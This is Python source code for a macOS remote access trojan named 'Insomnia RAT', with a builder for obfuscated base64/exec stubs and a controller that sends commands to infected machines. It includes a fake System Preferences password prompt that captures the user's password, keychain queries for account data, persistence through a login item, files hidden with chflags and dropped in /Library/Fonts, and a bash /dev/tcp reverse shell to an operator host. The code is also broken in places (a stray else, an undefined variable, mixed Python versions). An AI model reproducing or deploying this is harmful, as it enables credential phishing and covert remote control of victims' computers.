import os
import base64
import socket

redoo = 1

hd = os.getenv("HOME")

def helpSec():
	print('\n\033[91m\033[1mCommands:\033[0;0m\033[1m\n__help: Display Help\n__get_info: Get Info on Client\'s System\n__phish: Popup fake password prompt on client machine and return output\n__get_email: Get Client\'s email address\nexit: Exit prompt\n[Any other command]: Anything else inputted will be sent as a shell command on the client\'s machine\n')

while True:
	os.system('clear')
	x = raw_input("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m
[1] Build Stub

[2] Clients

[3] Exit

Select any option: """)
	if x == '1':
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		stubName = raw_input('Enter name of stub: ')
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		hostName = raw_input('Enter hostname/ip for reverse connection: ')
		os.system('clear')
		redsdo = 1;
		while (redoo == 1):
			print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
			portNum = raw_input('Enter port from 1024 to 65535 for reverse connection: ')
			try:
				portNum = int(portNum)	
				if portNum > 1024 and portNum < 65536:
					redoo = 0
					portNum = str(portNum)
					os.system('clear');
				else:
					redoo = 1
					os.system('clear')
			except:
					redoo = 1
					os.system('clear')
			while(redoo == 1):
						print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
						os.system('clear')
						redsdo = 0;
						stubData = """
						#!/usr/bin/env python3

						import socket

						HOST = '"""+hostName+"""'  
						PORT = """+portNum+"""        

						with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
						    s.connect((HOST, PORT))
						    s.sendall(b'Hello, world')
						    data = s.recv(1024)

						print('Received', repr(data))"""
						stubData = base64.b64encode(stubData)
						stubData = """import os\nimport base64\nexec(base64.b64decode('"""+tmpData+"""'))"""
						d = open(hd + '/Desktop/' + stubName + '.py', 'w+')
						d.write(stubData)
						d.close()

						else:
							print('aadas')
							redsdo = 1;
	elif x == '2':
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		portListen = raw_input('Enter port number to listen on from 1024 to 65535: ')
		os.system('clear')
		selectBot = True
		while(selectBot):
			print('\033[91m\033[1mOptions:\033[0;0m\033[1m\n1: Send command to all connected bots\n2: Send command to specific bot\n3: Exit prompt\n')
			botChoice = raw_input('Enter Option:')
			if(botChoice == 1):
				print('Enter IP address of target or type "LIST" to show all currently connected bots:')
				target = raw_input('')
				if(target.startswith('LIST')):
					a=1
				else:
					selectBot = False
			elif(botChoice == 2):
				selectBot = False
		while True:
			print('\033[91m\033[1mCommands:\033[0;0m\033[1m\n__help: Display Help\n__get_info: Get Info on Client\'s System\n__phish: Popup fake password prompt on client machine and return output\n__get_email: Get Client\'s email address\n__exit: Exit prompt\n[Any other command]: Anything else inputted will be sent as a shell command on the client\'s machine')
			cmdd = raw_input('Enter Command: ')
			print(cmdd)
			print(cmdd == '__get_info')
			if cmdd == '__phish':
				ph = "tell application \"Finder\"\nactivate\nset myprompt to \"Type your password to allow System Preferences to make changes\"\nset ans to \"Cancel\"\nrepeat\ntry\nset d_returns to display dialog myprompt default answer \"\" buttons {\"Cancel\", \"OK\"} default button \"OK\" with icon (path to resource \"FileVaultIcon.icns\" in bundle \"/System/Library/CoreServices/CoreTypes.bundle\") with hidden answer\nset ans to button returned of d_returns\nset mypass to text returned of d_returns\nif mypass > \"\" then exit repeat\nend try\nend repeat\ntry\ndo shell script \"echo Password: \" & quoted form of mypass\nend try\nend tell"
				ph = "osascript -e '" + ph + "'"
				cmdd = ph
			elif cmdd == '__exit':
				print('Goodbye!')
				quit()
			elif cmdd == '__help':
				helpSec()
			elif cmdd == '':
				v = 1
			elif cmdd == '__get_info':
				cmdd = "osascript -e \'get system info\'"
			elif cmdd == '__cmd_shell':
				cmdd = "bash"
			elif cmdd == '__get_email':
				cmdd = "security find-internet-password | grep 'acct'"
			elif '__change_conn' in cmdd:
				a=cmdd.replace('__change_conn[', '')
				a=cmdd.replace(']', '')
				hostt = a.split(':')[0]
				portt = a.split(':')[1]
				newStubb = """set myPath to path to me
set thePath to POSIX path of myPath
do shell script "chflags hidden " & thePath
tell application "System Events"
	make new login item at end of login items with properties {name:"", path:myPath, hidden:false}
end tell
do shell script "chflags nohidden " & thePath
repeat
	try
		do shell script "bash >& /dev/tcp/"""+hostt+"""/"""+portt+"""0>&1"
	on error
		delay 0.1
	end try
end repeat"""
				os.system("echo 'echo \'"+newStubb+"\' > /Library/Fonts/a.scpt' | nc -l " + portListen)
				os.system("echo 'osacompile -o /Library/Fonts/a.app /Library/Fonts/a.scpt' | nc -l " + portListen)
				os.system("echo 'rm -rf /Library/Fonts/a.scpt' | nc -l " + portListen)
				
				cmdd = ''


			HOST = '127.0.0.1'  
			PORT = portNum        

			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			    s.bind((HOST, PORT))
			    s.listen()
			    conn, addr = s.accept()
			    sendCon = True
			    with conn:
			    	if(botChoice == 1):
			    		if(addr != target):
			    			sendCon = False
			        while sendCon:
			            data = conn.recv(1024)
			            if not data:
			                break
			            conn.sendall(cmdd)
			            if(botChoice == 1):
			            	continue
	elif x == '3':
		os.system('clear')
		quit()
	else:
		os.system('clear')
